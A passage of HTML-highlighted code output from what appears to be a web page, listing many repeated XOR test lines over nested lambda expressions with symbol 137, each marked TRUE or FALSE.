class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)<br>(<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)<br>(<span class="hljs-name">XOR</span> [<span 